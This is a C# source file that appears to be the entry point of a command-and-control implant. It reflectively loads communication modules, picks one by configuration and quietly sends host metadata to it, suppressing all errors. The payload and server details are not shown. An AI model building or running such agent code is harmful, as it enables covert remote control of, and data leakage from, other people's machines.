using Implant.CommunicationModule;
using Implant.Services;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;

namespace Implant
{
    internal class Program
    {

        private static List<CommunactionModule> _communactions = new List<CommunactionModule>();

        private static void Main(string[] args)
        {
            CommandsList.LoadAgentCommands();
            LoadCommModules();

            List<CommunactionModule> communactionModules = GetCommunactionModules();
            
            var communactionModule = communactionModules.FirstOrDefault(c => c.Type.Equals(Config.Type, StringComparison.OrdinalIgnoreCase));
            if (communactionModule is null)
            {

                return;
            }
           
            try
            {
                communactionModule.SendRequest(AgentMetadataService.GetMetada());

            }
            catch (Exception e)
            {
                return;
            }
        }

        public static void LoadCommModules()
        {
            var self = Assembly.GetExecutingAssembly();

            foreach (var type in self.GetTypes())
            {
                if (type.IsSubclassOf(typeof(CommunactionModule)))
                {
                    var instance = (CommunactionModule)Activator.CreateInstance(type);
                    _communactions.Add(instance);
                }
            }
        }

        public static List<CommunactionModule> GetCommunactionModules()
        {
            return _communactions;
        }
    }
}
